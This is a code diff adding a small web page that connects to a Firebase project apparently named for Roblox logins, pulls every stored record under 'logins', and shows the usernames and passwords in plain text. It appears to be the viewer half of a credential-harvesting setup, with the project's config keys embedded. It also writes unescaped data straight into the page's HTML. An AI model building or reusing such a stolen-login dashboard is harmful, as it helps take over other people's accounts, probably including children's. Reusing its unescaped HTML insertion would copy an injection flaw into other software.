@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Saved Login Info</title>
+</head>
+<body>
+
+<h1>Saved Login Info</h1>
+<div id="output"></div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDJML3HMx4pyWkHk6Q0H80gAPFLi8qrSdM",
+  authDomain: "roblox-login-project.firebaseapp.com",
+  databaseURL: "https://roblox-login-project-default-rtdb.firebaseio.com",
+  projectId: "roblox-login-project",
+  storageBucket: "roblox-login-project.firebasestorage.app",
+  messagingSenderId: "465627914097",
+  appId: "1:465627914097:web:13780ccefe7a4aa11760d0",
+  measurementId: "G-8FSRF9M9HH"
+};
+
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+const output = document.getElementById("output");
+
+database.ref("logins").on("value", function(snapshot) {
+  const data = snapshot.val();
+
+  output.innerHTML = "";
+
+  if (!data) {
+    output.innerHTML = "<p>No saved login info found.</p>";
+    return;
+  }
+
+  for (let key in data) {
+    output.innerHTML += `
+      <p><strong>Username:</strong> ${data[key].username}</p>
+      <p><strong>Password:</strong> ${data[key].password}</p>
+      <hr>
+    `;
+  }
+});
+</script>
+
+</body>
+</html>
